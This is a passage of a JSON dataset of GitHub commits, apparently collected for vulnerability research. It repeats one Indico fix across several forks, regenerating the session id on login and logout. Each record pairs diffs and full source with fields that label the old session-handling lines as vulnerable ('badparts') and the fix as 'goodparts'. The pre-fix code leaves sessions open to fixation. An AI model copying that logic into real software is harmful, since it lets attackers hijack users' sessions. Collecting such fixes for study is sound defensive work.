= new\n        self.modified = False\n        defaults = self._get_defaults()\n        if defaults:\n            self.update(defaults)\n\n    def _get_defaults(self):\n        # Note: This is called before there is a DB connection available!\n        return None\n\n\n# Hey, if you intend on adding a custom property to this class:\n# - Only do it if you need logic behind it. Otherwise use the dict API!\n# - Even if you do need logic, keep it to core stuff. Otherwise it probably does not belong here!\n# - Always prefix the dict keys backing a property with an underscore (to prevent clashes with externally-set items)\n# - When you store something like the avatar that involves a DB lookup, use cached_writable_property\nclass IndicoSession(BaseSession):\n    @cached_writable_property('_user')\n    def user(self):\n        user_id = self.get('_user_id')\n        user = User.get(user_id) if user_id is not None else None\n        if user and user.is_deleted:\n            merged_into_user = user.merged_into_user\n            user = None\n            # If the user is deleted and the request is likely to be seen by\n            # the user, we forcefully log him out and inform him about it.\n            if not request.is_xhr and request.blueprint != 'assets':\n                self.clear()\n                if merged_into_user:\n                    msg = _(u'Your profile has been merged into <strong>{}<\/strong>. '\n                            u'Please log in using that profile.')\n                    flash(Markup(msg).format(merged_into_user.full_name), 'warning')\n                else:\n                    flash(_(u'Your profile has been deleted.'), 'error')\n        return user\n\n    @user.setter\n    def user(self, user):\n        if user is None:\n            self.pop('_user_id', None)\n        else:\n            self['_user_id'] = user.id\n\n    @property\n    def avatar(self):\n        return self.user.as_avatar if self.user else None\n\n    @property\n    def lang(self):\n        if '_lang' in self:\n            return self['_lang']\n        elif self.user:\n            return self.user.settings.get('lang')\n        else:\n            return None\n\n    @lang.setter\n    def lang(self, lang):\n        self['_lang'] = lang\n\n    @cached_property\n    def csrf_token(self):\n        if '_csrf_token' not in self:\n            self['_csrf_token'] = str(uuid.uuid4())\n        return self['_csrf_token']\n\n    @property\n    def csrf_protected(self):\n        return self.user is not None\n\n    @property\n    def timezone(self):\n        if '_timezone' in self:\n            return self['_timezone']\n        if '_user_id' not in self:\n            return 'LOCAL'\n        return Config.getInstance().getDefaultTimezone()\n\n    @timezone.setter\n    def timezone(self, tz):\n        self['_timezone'] = tz\n\n\nclass IndicoSessionInterface(SessionInterface):\n    pickle_based = True\n    serializer = cPickle\n    session_class = IndicoSession\n    temporary_session_lifetime = timedelta(days=7)\n\n    def __init__(self):\n        self.storage = GenericCache('flask-session')\n\n    def generate_sid(self):\n        return str(uuid.uuid4())\n\n    def get_cookie_secure(self, app):\n        return request.is_secure\n\n    def get_storage_lifetime(self, app, session):\n        # Permanent sessions are stored for exactly the same duration as the session id cookie.\n        # \"Temporary\" session are stored for a period that is not too short\/long as some people\n        # close their browser very rarely and thus shouldn't be logged out that often.\n        if session.permanent:\n            return app.permanent_session_lifetime\n        else:\n            return self.temporary_session_lifetime\n\n    def should_refresh_session(self, app, session):\n        if session.new or '_expires' not in session:\n            return False\n        threshold = self.get_storage_lifetime(app, session) \/ 2\n        return session['_expires'] - datetime.now() < threshold\n\n    def should_refresh_sid(self, app, session):\n        return self.get_cookie_secure(app) and not session.get('_secure')\n\n    def open_session(self, app, request):\n        sid = request.cookies.get(app.session_cookie_name)\n        if not sid:\n            return self.session_class(sid=self.generate_sid(), new=True)\n        data = self.storage.get(sid)\n        if data is not None:\n            return self.session_class(self.serializer.loads(data), sid=sid)\n        return self.session_class(sid=self.generate_sid(), new=True)\n\n    def save_session(self, app, session, response):\n        domain = self.get_cookie_domain(app)\n        secure = self.get_cookie_secure(app)\n        refresh_sid = self.should_refresh_sid(app, session)\n        if not session and not session.new:\n            # empty session, delete it from storage and cookie\n            self.storage.delete(session.sid)\n            response.delete_cookie(app.session_cookie_name, domain=domain)\n            return\n\n        if not refresh_sid and not session.modified and not self.should_refresh_session(app, session):\n            # If the session has not been modified we only store if it needs to be refreshed\n            return\n\n        if app.config['INDICO_SESSION_PERMANENT']:\n            # Setting session.permanent marks the session as modified so we only set it when we\n            # are saving the session anyway!\n            session.permanent = True\n\n        storage_ttl = self.get_storage_lifetime(app, session)\n        cookie_lifetime = self.get_expiration_time(app, session)\n        session['_expires'] = datetime.now() + storage_ttl\n\n        if refresh_sid:\n            self.storage.delete(session.sid)\n            session.sid = self.generate_sid()\n\n        session['_secure'] = request.is_secure\n        self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl)\n        response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True,\n                            secure=secure)\n"}},"msg":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation"}},"https:\/\/github.com\/belokop\/indico":{"f94958bcf8d5e23264ab5a0d257f6a637be64e7b":{"url":"https:\/\/api.github.com\/repos\/belokop\/indico\/commits\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","html_url":"https:\/\/github.com\/belokop\/indico\/commit\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","message":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation","sha":"f94958bcf8d5e23264ab5a0d257f6a637be64e7b","keyword":"session fixation prevent","diff":"diff --git a\/indico\/web\/flask\/session.py b\/indico\/web\/flask\/session.py\nindex c0a89b047..62bf31c26 100644\n--- a\/indico\/web\/flask\/session.py\n+++ b\/indico\/web\/flask\/session.py\n@@ -81,6 +81,7 @@ def user(self, user):\n             self.pop('_user_id', None)\n         else:\n             self['_user_id'] = user.id\n+        self._refresh_sid = True\n \n     @property\n     def avatar(self):\n@@ -153,7 +154,11 @@ def should_refresh_session(self, app, session):\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","files":{"\/indico\/web\/flask\/session.py":{"changes":[{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]},{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]}],"source":"\n from __future__ import absolute_import import cPickle import uuid from datetime import datetime, timedelta from flask import request, flash from flask.sessions import SessionInterface, SessionMixin from markupsafe import Markup from werkzeug.datastructures import CallbackDict from werkzeug.utils import cached_property from indico.core.config import Config from indico.modules.users import User from indico.util.decorators import cached_writable_property from indico.util.i18n import _ from MaKaC.common.cache import GenericCache class BaseSession(CallbackDict, SessionMixin): def __init__(self, initial=None, sid=None, new=False): def on_update(self): self.modified=True CallbackDict.__init__(self, initial, on_update) self.sid=sid self.new=new self.modified=False defaults=self._get_defaults() if defaults: self.update(defaults) def _get_defaults(self): return None class IndicoSession(BaseSession): @cached_writable_property('_user') def user(self): user_id=self.get('_user_id') user=User.get(user_id) if user_id is not None else None if user and user.is_deleted: merged_into_user=user.merged_into_user user=None if not request.is_xhr and request.blueprint !='assets': self.clear() if merged_into_user: msg=_(u'Your profile has been merged into <strong>{}<\/strong>. ' u'Please log in using that profile.') flash(Markup(msg).format(merged_into_user.full_name), 'warning') else: flash(_(u'Your profile has been deleted.'), 'error') return user @user.setter def user(self, user): if user is None: self.pop('_user_id', None) else: self['_user_id']=user.id @property def avatar(self): return self.user.as_avatar if self.user else None @property def lang(self): if '_lang' in self: return self['_lang'] elif self.user: return self.user.settings.get('lang') else: return None @lang.setter def lang(self, lang): self['_lang']=lang @cached_property def csrf_token(self): if '_csrf_token' not in self: self['_csrf_token']=str(uuid.uuid4()) return self['_csrf_token'] @property def csrf_protected(self): return self.user is not None @property def timezone(self): if '_timezone' in self: return self['_timezone'] if '_user_id' not in self: return 'LOCAL' return Config.getInstance().getDefaultTimezone() @timezone.setter def timezone(self, tz): self['_timezone']=tz class IndicoSessionInterface(SessionInterface): pickle_based=True serializer=cPickle session_class=IndicoSession temporary_session_lifetime=timedelta(days=7) def __init__(self): self.storage=GenericCache('flask-session') def generate_sid(self): return str(uuid.uuid4()) def get_cookie_secure(self, app): return request.is_secure def get_storage_lifetime(self, app, session): if session.permanent: return app.permanent_session_lifetime else: return self.temporary_session_lifetime def should_refresh_session(self, app, session): if session.new or '_expires' not in session: return False threshold=self.get_storage_lifetime(app, session) \/ 2 return session['_expires'] -datetime.now() < threshold def should_refresh_sid(self, app, session): return self.get_cookie_secure(app) and not session.get('_secure') def open_session(self, app, request): sid=request.cookies.get(app.session_cookie_name) if not sid: return self.session_class(sid=self.generate_sid(), new=True) data=self.storage.get(sid) if data is not None: return self.session_class(self.serializer.loads(data), sid=sid) return self.session_class(sid=self.generate_sid(), new=True) def save_session(self, app, session, response): domain=self.get_cookie_domain(app) secure=self.get_cookie_secure(app) refresh_sid=self.should_refresh_sid(app, session) if not session and not session.new: self.storage.delete(session.sid) response.delete_cookie(app.session_cookie_name, domain=domain) return if not refresh_sid and not session.modified and not self.should_refresh_session(app, session): return if app.config['INDICO_SESSION_PERMANENT']: session.permanent=True storage_ttl=self.get_storage_lifetime(app, session) cookie_lifetime=self.get_expiration_time(app, session) session['_expires']=datetime.now() +storage_ttl if refresh_sid: self.storage.delete(session.sid) session.sid=self.generate_sid() session['_secure']=request.is_secure self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl) response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True, secure=secure) ","sourceWithComments":"# This file is part of Indico.\n# Copyright (C) 2002 - 2015 European Organization for Nuclear Research (CERN).\n#\n# Indico is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 3 of the\n# License, or (at your option) any later version.\n#\n# Indico is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Indico; if not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nfrom __future__ import absolute_import\n\nimport cPickle\nimport uuid\nfrom datetime import datetime, timedelta\n\nfrom flask import request, flash\nfrom flask.sessions import SessionInterface, SessionMixin\nfrom markupsafe import Markup\nfrom werkzeug.datastructures import CallbackDict\nfrom werkzeug.utils import cached_property\n\nfrom indico.core.config import Config\nfrom indico.modules.users import User\nfrom indico.util.decorators import cached_writable_property\nfrom indico.util.i18n import _\nfrom MaKaC.common.cache import GenericCache\n\n\nclass BaseSession(CallbackDict, SessionMixin):\n    def __init__(self, initial=None, sid=None, new=False):\n        def on_update(self):\n            self.modified = True\n        CallbackDict.__init__(self, initial, on_update)\n        self.sid = sid\n        self.new = new\n        self.modified = False\n        defaults = self._get_defaults()\n        if defaults:\n            self.update(defaults)\n\n    def _get_defaults(self):\n        # Note: This is called before there is a DB connection available!\n        return None\n\n\n# Hey, if you intend on adding a custom property to this class:\n# - Only do it if you need logic behind it. Otherwise use the dict API!\n# - Even if you do need logic, keep it to core stuff. Otherwise it probably does not belong here!\n# - Always prefix the dict keys backing a property with an underscore (to prevent clashes with externally-set items)\n# - When you store something like the avatar that involves a DB lookup, use cached_writable_property\nclass IndicoSession(BaseSession):\n    @cached_writable_property('_user')\n    def user(self):\n        user_id = self.get('_user_id')\n        user = User.get(user_id) if user_id is not None else None\n        if user and user.is_deleted:\n            merged_into_user = user.merged_into_user\n            user = None\n            # If the user is deleted and the request is likely to be seen by\n            # the user, we forcefully log him out and inform him about it.\n            if not request.is_xhr and request.blueprint != 'assets':\n                self.clear()\n                if merged_into_user:\n                    msg = _(u'Your profile has been merged into <strong>{}<\/strong>. '\n                            u'Please log in using that profile.')\n                    flash(Markup(msg).format(merged_into_user.full_name), 'warning')\n                else:\n                    flash(_(u'Your profile has been deleted.'), 'error')\n        return user\n\n    @user.setter\n    def user(self, user):\n        if user is None:\n            self.pop('_user_id', None)\n        else:\n            self['_user_id'] = user.id\n\n    @property\n    def avatar(self):\n        return self.user.as_avatar if self.user else None\n\n    @property\n    def lang(self):\n        if '_lang' in self:\n            return self['_lang']\n        elif self.user:\n            return self.user.settings.get('lang')\n        else:\n            return None\n\n    @lang.setter\n    def lang(self, lang):\n        self['_lang'] = lang\n\n    @cached_property\n    def csrf_token(self):\n        if '_csrf_token' not in self:\n            self['_csrf_token'] = str(uuid.uuid4())\n        return self['_csrf_token']\n\n    @property\n    def csrf_protected(self):\n        return self.user is not None\n\n    @property\n    def timezone(self):\n        if '_timezone' in self:\n            return self['_timezone']\n        if '_user_id' not in self:\n            return 'LOCAL'\n        return Config.getInstance().getDefaultTimezone()\n\n    @timezone.setter\n    def timezone(self, tz):\n        self['_timezone'] = tz\n\n\nclass IndicoSessionInterface(SessionInterface):\n    pickle_based = True\n    serializer = cPickle\n    session_class = IndicoSession\n    temporary_session_lifetime = timedelta(days=7)\n\n    def __init__(self):\n        self.storage = GenericCache('flask-session')\n\n    def generate_sid(self):\n        return str(uuid.uuid4())\n\n    def get_cookie_secure(self, app):\n        return request.is_secure\n\n    def get_storage_lifetime(self, app, session):\n        # Permanent sessions are stored for exactly the same duration as the session id cookie.\n        # \"Temporary\" session are stored for a period that is not too short\/long as some people\n        # close their browser very rarely and thus shouldn't be logged out that often.\n        if session.permanent:\n            return app.permanent_session_lifetime\n        else:\n            return self.temporary_session_lifetime\n\n    def should_refresh_session(self, app, session):\n        if session.new or '_expires' not in session:\n            return False\n        threshold = self.get_storage_lifetime(app, session) \/ 2\n        return session['_expires'] - datetime.now() < threshold\n\n    def should_refresh_sid(self, app, session):\n        return self.get_cookie_secure(app) and not session.get('_secure')\n\n    def open_session(self, app, request):\n        sid = request.cookies.get(app.session_cookie_name)\n        if not sid:\n            return self.session_class(sid=self.generate_sid(), new=True)\n        data = self.storage.get(sid)\n        if data is not None:\n            return self.session_class(self.serializer.loads(data), sid=sid)\n        return self.session_class(sid=self.generate_sid(), new=True)\n\n    def save_session(self, app, session, response):\n        domain = self.get_cookie_domain(app)\n        secure = self.get_cookie_secure(app)\n        refresh_sid = self.should_refresh_sid(app, session)\n        if not session and not session.new:\n            # empty session, delete it from storage and cookie\n            self.storage.delete(session.sid)\n            response.delete_cookie(app.session_cookie_name, domain=domain)\n            return\n\n        if not refresh_sid and not session.modified and not self.should_refresh_session(app, session):\n            # If the session has not been modified we only store if it needs to be refreshed\n            return\n\n        if app.config['INDICO_SESSION_PERMANENT']:\n            # Setting session.permanent marks the session as modified so we only set it when we\n            # are saving the session anyway!\n            session.permanent = True\n\n        storage_ttl = self.get_storage_lifetime(app, session)\n        cookie_lifetime = self.get_expiration_time(app, session)\n        session['_expires'] = datetime.now() + storage_ttl\n\n        if refresh_sid:\n            self.storage.delete(session.sid)\n            session.sid = self.generate_sid()\n\n        session['_secure'] = request.is_secure\n        self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl)\n        response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True,\n                            secure=secure)\n"}},"msg":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation"}},"https:\/\/github.com\/indico\/indico":{"f94958bcf8d5e23264ab5a0d257f6a637be64e7b":{"url":"https:\/\/api.github.com\/repos\/indico\/indico\/commits\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","html_url":"https:\/\/github.com\/indico\/indico\/commit\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","message":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation","sha":"f94958bcf8d5e23264ab5a0d257f6a637be64e7b","keyword":"session fixation prevent","diff":"diff --git a\/indico\/web\/flask\/session.py b\/indico\/web\/flask\/session.py\nindex c0a89b0475f..62bf31c26d1 100644\n--- a\/indico\/web\/flask\/session.py\n+++ b\/indico\/web\/flask\/session.py\n@@ -81,6 +81,7 @@ def user(self, user):\n             self.pop('_user_id', None)\n         else:\n             self['_user_id'] = user.id\n+        self._refresh_sid = True\n \n     @property\n     def avatar(self):\n@@ -153,7 +154,11 @@ def should_refresh_session(self, app, session):\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","files":{"\/indico\/web\/flask\/session.py":{"changes":[{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]},{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]}],"source":"\n from __future__ import absolute_import import cPickle import uuid from datetime import datetime, timedelta from flask import request, flash from flask.sessions import SessionInterface, SessionMixin from markupsafe import Markup from werkzeug.datastructures import CallbackDict from werkzeug.utils import cached_property from indico.core.config import Config from indico.modules.users import User from indico.util.decorators import cached_writable_property from indico.util.i18n import _ from MaKaC.common.cache import GenericCache class BaseSession(CallbackDict, SessionMixin): def __init__(self, initial=None, sid=None, new=False): def on_update(self): self.modified=True CallbackDict.__init__(self, initial, on_update) self.sid=sid self.new=new self.modified=False defaults=self._get_defaults() if defaults: self.update(defaults) def _get_defaults(self): return None class IndicoSession(BaseSession): @cached_writable_property('_user') def user(self): user_id=self.get('_user_id') user=User.get(user_id) if user_id is not None else None if user and user.is_deleted: merged_into_user=user.merged_into_user user=None if not request.is_xhr and request.blueprint !='assets': self.clear() if merged_into_user: msg=_(u'Your profile has been merged into <strong>{}<\/strong>. ' u'Please log in using that profile.') flash(Markup(msg).format(merged_into_user.full_name), 'warning') else: flash(_(u'Your profile has been deleted.'), 'error') return user @user.setter def user(self, user): if user is None: self.pop('_user_id', None) else: self['_user_id']=user.id @property def avatar(self): return self.user.as_avatar if self.user else None @property def lang(self): if '_lang' in self: return self['_lang'] elif self.user: return self.user.settings.get('lang') else: return None @lang.setter def lang(self, lang): self['_lang']=lang @cached_property def csrf_token(self): if '_csrf_token' not in self: self['_csrf_token']=str(uuid.uuid4()) return self['_csrf_token'] @property def csrf_protected(self): return self.user is not None @property def timezone(self): if '_timezone' in self: return self['_timezone'] if '_user_id' not in self: return 'LOCAL' return Config.getInstance().getDefaultTimezone() @timezone.setter def timezone(self, tz): self['_timezone']=tz class IndicoSessionInterface(SessionInterface): pickle_based=True serializer=cPickle session_class=IndicoSession temporary_session_lifetime=timedelta(days=7) def __init__(self): self.storage=GenericCache('flask-session') def generate_sid(self): return str(uuid.uuid4()) def get_cookie_secure(self, app): return request.is_secure def get_storage_lifetime(self, app, session): if session.permanent: return app.permanent_session_lifetime else: return self.temporary_session_lifetime def should_refresh_session(self, app, session): if session.new or '_expires' not in session: return False threshold=self.get_storage_lifetime(app, session) \/ 2 return session['_expires'] -datetime.now() < threshold def should_refresh_sid(self, app, session): return self.get_cookie_secure(app) and not session.get('_secure') def open_session(self, app, request): sid=request.cookies.get(app.session_cookie_name) if not sid: return self.session_class(sid=self.generate_sid(), new=True) data=self.storage.get(sid) if data is not None: return self.session_class(self.serializer.loads(data), sid=sid) return self.session_class(sid=self.generate_sid(), new=True) def save_session(self, app, session, response): domain=self.get_cookie_domain(app) secure=self.get_cookie_secure(app) refresh_sid=self.should_refresh_sid(app, session) if not session and not session.new: self.storage.delete(session.sid) response.delete_cookie(app.session_cookie_name, domain=domain) return if not refresh_sid and not session.modified and not self.should_refresh_session(app, session): return if app.config['INDICO_SESSION_PERMANENT']: session.permanent=True storage_ttl=self.get_storage_lifetime(app, session) cookie_lifetime=self.get_expiration_time(app, session) session['_expires']=datetime.now() +storage_ttl if refresh_sid: self.storage.delete(session.sid) session.sid=self.generate_sid() session['_secure']=request.is_secure self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl) response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True, secure=secure) ","sourceWithComments":"# This file is part of Indico.\n# Copyright (C) 2002 - 2015 European Organization for Nuclear Research (CERN).\n#\n# Indico is free software; you can redistribute it and\/or\n# modify it under the terms of the GNU General Public License as\n# published by the Free Software Foundation; either version 3 of the\n# License, or (at your option) any later version.\n#\n# Indico is distributed in the hope that it will be useful, but\n# WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Indico; if not, see <http:\/\/www.gnu.org\/licenses\/>.\n\nfrom __future__ import absolute_import\n\nimport cPickle\nimport uuid\nfrom datetime import datetime, timedelta\n\nfrom flask import request, flash\nfrom flask.sessions import SessionInterface, SessionMixin\nfrom markupsafe import Markup\nfrom werkzeug.datastructures import CallbackDict\nfrom werkzeug.utils import cached_property\n\nfrom indico.core.config import Config\nfrom indico.modules.users import User\nfrom indico.util.decorators import cached_writable_property\nfrom indico.util.i18n import _\nfrom MaKaC.common.cache import GenericCache\n\n\nclass BaseSession(CallbackDict, SessionMixin):\n    def __init__(self, initial=None, sid=None, new=False):\n        def on_update(self):\n            self.modified = True\n        CallbackDict.__init__(self, initial, on_update)\n        self.sid = sid\n        self.new = new\n        self.modified = False\n        defaults = self._get_defaults()\n        if defaults:\n            self.update(defaults)\n\n    def _get_defaults(self):\n        # Note: This is called before there is a DB connection available!\n        return None\n\n\n# Hey, if you intend on adding a custom property to this class:\n# - Only do it if you need logic behind it. Otherwise use the dict API!\n# - Even if you do need logic, keep it to core stuff. Otherwise it probably does not belong here!\n# - Always prefix the dict keys backing a property with an underscore (to prevent clashes with externally-set items)\n# - When you store something like the avatar that involves a DB lookup, use cached_writable_property\nclass IndicoSession(BaseSession):\n    @cached_writable_property('_user')\n    def user(self):\n        user_id = self.get('_user_id')\n        user = User.get(user_id) if user_id is not None else None\n        if user and user.is_deleted:\n            merged_into_user = user.merged_into_user\n            user = None\n            # If the user is deleted and the request is likely to be seen by\n            # the user, we forcefully log him out and inform him about it.\n            if not request.is_xhr and request.blueprint != 'assets':\n                self.clear()\n                if merged_into_user:\n                    msg = _(u'Your profile has been merged into <strong>{}<\/strong>. '\n                            u'Please log in using that profile.')\n                    flash(Markup(msg).format(merged_into_user.full_name), 'warning')\n                else:\n                    flash(_(u'Your profile has been deleted.'), 'error')\n        return user\n\n    @user.setter\n    def user(self, user):\n        if user is None:\n            self.pop('_user_id', None)\n        else:\n            self['_user_id'] = user.id\n\n    @property\n    def avatar(self):\n        return self.user.as_avatar if self.user else None\n\n    @property\n    def lang(self):\n        if '_lang' in self:\n            return self['_lang']\n        elif self.user:\n            return self.user.settings.get('lang')\n        else:\n            return None\n\n    @lang.setter\n    def lang(self, lang):\n        self['_lang'] = lang\n\n    @cached_property\n    def csrf_token(self):\n        if '_csrf_token' not in self:\n            self['_csrf_token'] = str(uuid.uuid4())\n        return self['_csrf_token']\n\n    @property\n    def csrf_protected(self):\n        return self.user is not None\n\n    @property\n    def timezone(self):\n        if '_timezone' in self:\n            return self['_timezone']\n        if '_user_id' not in self:\n            return 'LOCAL'\n        return Config.getInstance().getDefaultTimezone()\n\n    @timezone.setter\n    def timezone(self, tz):\n        self['_timezone'] = tz\n\n\nclass IndicoSessionInterface(SessionInterface):\n    pickle_based = True\n    serializer = cPickle\n    session_class = IndicoSession\n    temporary_session_lifetime = timedelta(days=7)\n\n    def __init__(self):\n        self.storage = GenericCache('flask-session')\n\n    def generate_sid(self):\n        return str(uuid.uuid4())\n\n    def get_cookie_secure(self, app):\n        return request.is_secure\n\n    def get_storage_lifetime(self, app, session):\n        # Permanent sessions are stored for exactly the same duration as the session id cookie.\n        # \"Temporary\" session are stored for a period that is not too short\/long as some people\n        # close their browser very rarely and thus shouldn't be logged out that often.\n        if session.permanent:\n            return app.permanent_session_lifetime\n        else:\n            return self.temporary_session_lifetime\n\n    def should_refresh_session(self, app, session):\n        if session.new or '_expires' not in session:\n            return False\n        threshold = self.get_storage_lifetime(app, session) \/ 2\n        return session['_expires'] - datetime.now() < threshold\n\n    def should_refresh_sid(self, app, session):\n        return self.get_cookie_secure(app) and not session.get('_secure')\n\n    def open_session(self, app, request):\n        sid = request.cookies.get(app.session_cookie_name)\n        if not sid:\n            return self.session_class(sid=self.generate_sid(), new=True)\n        data = self.storage.get(sid)\n        if data is not None:\n            return self.session_class(self.serializer.loads(data), sid=sid)\n        return self.session_class(sid=self.generate_sid(), new=True)\n\n    def save_session(self, app, session, response):\n        domain = self.get_cookie_domain(app)\n        secure = self.get_cookie_secure(app)\n        refresh_sid = self.should_refresh_sid(app, session)\n        if not session and not session.new:\n            # empty session, delete it from storage and cookie\n            self.storage.delete(session.sid)\n            response.delete_cookie(app.session_cookie_name, domain=domain)\n            return\n\n        if not refresh_sid and not session.modified and not self.should_refresh_session(app, session):\n            # If the session has not been modified we only store if it needs to be refreshed\n            return\n\n        if app.config['INDICO_SESSION_PERMANENT']:\n            # Setting session.permanent marks the session as modified so we only set it when we\n            # are saving the session anyway!\n            session.permanent = True\n\n        storage_ttl = self.get_storage_lifetime(app, session)\n        cookie_lifetime = self.get_expiration_time(app, session)\n        session['_expires'] = datetime.now() + storage_ttl\n\n        if refresh_sid:\n            self.storage.delete(session.sid)\n            session.sid = self.generate_sid()\n\n        session['_secure'] = request.is_secure\n        self.storage.set(session.sid, self.serializer.dumps(dict(session)), storage_ttl)\n        response.set_cookie(app.session_cookie_name, session.sid, expires=cookie_lifetime, httponly=True,\n                            secure=secure)\n"}},"msg":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation"}},"https:\/\/github.com\/eliasdesousa\/indico":{"f94958bcf8d5e23264ab5a0d257f6a637be64e7b":{"url":"https:\/\/api.github.com\/repos\/eliasdesousa\/indico\/commits\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","html_url":"https:\/\/github.com\/eliasdesousa\/indico\/commit\/f94958bcf8d5e23264ab5a0d257f6a637be64e7b","message":"Regenerate sid on login\/logout\n\nPrevents \"cookie tossing\" \/ session fixation","sha":"f94958bcf8d5e23264ab5a0d257f6a637be64e7b","keyword":"session fixation prevent","diff":"diff --git a\/indico\/web\/flask\/session.py b\/indico\/web\/flask\/session.py\nindex c0a89b047..62bf31c26 100644\n--- a\/indico\/web\/flask\/session.py\n+++ b\/indico\/web\/flask\/session.py\n@@ -81,6 +81,7 @@ def user(self, user):\n             self.pop('_user_id', None)\n         else:\n             self['_user_id'] = user.id\n+        self._refresh_sid = True\n \n     @property\n     def avatar(self):\n@@ -153,7 +154,11 @@ def should_refresh_session(self, app, session):\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","files":{"\/indico\/web\/flask\/session.py":{"changes":[{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+        if self.get_cookie_secure(app) and not session.get('_secure'):\n+            return True\n+        if getattr(session, '_refresh_sid', False):\n+            return True\n+        return False\n \n     def open_session(self, app, request):\n         sid = request.cookies.get(app.session_cookie_name)\n","add":5,"remove":1,"filename":"\/indico\/web\/flask\/session.py","badparts":["        return self.get_cookie_secure(app) and not session.get('_secure')"],"goodparts":["        if self.get_cookie_secure(app) and not session.get('_secure'):","            return True","        if getattr(session, '_refresh_sid', False):","            return True","        return False"]},{"diff":"\n         return session['_expires'] - datetime.now() < threshold\n \n     def should_refresh_sid(self, app, session):\n-        return self.get_cookie_secure(app) and not session.get('_secure')\n+  